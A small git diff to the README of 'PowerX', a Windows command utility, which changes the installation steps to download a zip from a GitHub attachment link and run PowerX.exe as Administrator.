@@ -46,8 +46,8 @@ PowerX includes **33 simplified Windows commands** across various categories:
 - Query/add/delete registry keys
 
 ## Installation
-### Option 2
-1. Download the PowerX script from the Release.
+### Option 1
+1. Download the PowerX from the [PowerX v1.0.0.zip](https://github.com/user-attachments/files/18725396/PowerX.v1.0.0.zip).
 2. Open PowerX.exe as Administrator.
 
 ### Option 2
